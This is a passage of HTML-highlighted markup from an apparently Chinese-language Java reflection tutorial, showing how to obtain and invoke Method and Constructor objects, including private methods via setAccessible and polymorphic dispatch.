&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getGrade&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// 获取private方法getGrade，参数为int
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">getScore&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">99&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">getGrade&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">year&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Person&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>一个&lt;code>Method&lt;/code>对象包含一个方法的所有信息，函数基本同上一个三级标题&lt;/li>
&lt;li>得到&lt;code>Method&lt;/code>后我们可以对他进行调用，方式是调用其&lt;code>invoke&lt;/code>，第一个参数是对象实例，后面为可变参数，与方法参数一致&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello world&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// String对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;substring&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取String substring(int)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">6&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 调用
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>值得注意的是，&lt;code>substring&lt;/code>自身有两个重载方法，我们获取的是其中的&lt;code>substring(int)&lt;/code>这个方法&lt;/p>
&lt;ul>
&lt;li>如果获取到的Method表示一个静态方法，调用静态方法时，由于无需指定实例对象，所以&lt;code>invoke&lt;/code>方法传入的第一个参数永远为&lt;code>null&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;parseInt&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取Integer.parseInt(String)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;12345&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 调用
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>同上一个三级标题对于private字段的处理，我们可以用&lt;code>Method.setAccessible(true)&lt;/code>，也存在同样可能失败的原因，不重复了&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;setName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>对于参数不同的方法 我们可以指定参数类型和数量，而对于多态，仍表现出多态的原则，即 总是调用实际类型的覆写方法（如果存在&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/** 相当于
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Person p = new Student();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> p.hello(); */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Person:hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 继承自Person 覆写hello方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Student:hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="调用构造方法">调用构造方法&lt;/h3>
&lt;ul>
&lt;li>正常的new会触发构造方法，通过class的new会有局限性（见上），为了调用任意的构造方法，我们可以使用反射的Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例；Constructor对象和Method非常类似，不同之处仅在于它是一个构造方法，并且，调用结果总是返回实例&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取某个public的Constructor
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">cons1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取构造方法Integer(int)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cons1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 调用构造方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">cons2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取构造方法Integer(String)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cons2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;456&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>注意&lt;code>Constructor&lt;/code>总是当前类定义的构造方法，和父类无关，因此不存在多态的问题&lt;/li>
